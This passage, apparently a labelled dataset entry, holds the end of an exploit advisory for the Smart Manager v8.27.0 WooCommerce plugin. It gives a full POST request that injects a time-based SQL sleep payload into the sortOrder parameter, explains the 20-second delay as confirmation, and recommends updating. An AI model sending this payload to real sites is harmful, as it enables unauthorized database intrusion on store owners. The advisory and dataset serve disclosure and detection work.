same-origin\ncmd=get_data_model&active_module=product&security=37e8d818b7&is_public=1&sm_page=1&sm_limit=50&SM_IS_WOO30=true&sort_params%5Bcolumn%5D=postmeta%2Fmeta_key%3D_tax_status%2Fmeta_value%3D_tax_status&sort_params%5BsortOrder%5D=asc%2c(select*from(select(sleep(20)))a)&table_model%5Bposts%5D%5Bpkey%5D=ID&table_model%5Bposts%5D%5Bjoin_on%5D=&table_model%5Bposts%5D%5Bwhere%5D%5Bpost_type%5D%5B%5D=product&table_model%5Bposts%5D%5Bwhere%5D%5Bpost_type%5D%5B%5D=product_variation&table_model%5Bposts%5D%5Bwhere%5D%5Bpost_status%5D=any&table_model%5Bpostmeta%5D%5Bpkey%5D=post_id&table_model%5Bpostmeta%5D%5Bjoin_on%5D=postmeta.post_ID+%3D+posts.ID&table_model%5Bterm_relationships%5D%5Bpkey%5D=object_id&table_model%5Bterm_relationships%5D%5Bjoin_on%5D=term_relationships.object_id+%3D+posts.ID&table_model%5Bterm_taxonomy%5D%5Bpkey%5D=term_taxonomy_id&table_model%5Bterm_taxonomy%5D%5Bjoin_on%5D=term_taxonomy.term_taxonomy_id+%3D+term_relationships.term_taxonomy_id&table_model%5Bterms%5D%5Bpkey%5D=term_id&table_model%5Bterms%5D%5Bjoin_on%5D=terms.term_id+%3D+term_taxonomy.term_id&search_text=&advanced_search_query=%5B%5D&is_view=0&isTasks=0&is_taxonomy=0\n```\n\nIf the server response is delayed by approximately 20 seconds, it indicates a successful exploitation of the time-based SQL Injection, confirming the vulnerability.\n\n## Recommendations\n\nUsers of Smart Manager v8.27.0 are strongly advised to restrict access to the affected endpoint and update the plugin to the latest version.",
+    "binary_label": 1,
+    "type_label": -1,
+    "label_quality": "strong",
+    "source": "final_dataset"
+  }
+]
